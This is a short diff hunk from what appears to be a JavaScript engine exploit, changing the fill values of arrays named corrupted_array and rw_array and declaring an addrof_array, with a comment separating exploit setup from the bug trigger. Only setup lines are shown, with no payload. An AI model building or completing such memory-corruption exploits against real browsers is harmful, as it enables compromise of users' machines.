@@ -12,9 +12,9 @@ function hex(val){
 // Line ~400+ is to trigger the bug, anything before that is for the exploit
 
 let corrupted_array = new Array(1367);
-corrupted_array.fill(-1.1);
+corrupted_array.fill(1.1);
 let rw_array = new Array(10000);
-rw_array.fill(-88.99);
+rw_array.fill(1.1);
 let addrof_array = new Array(1338);
 
 class Helpers {
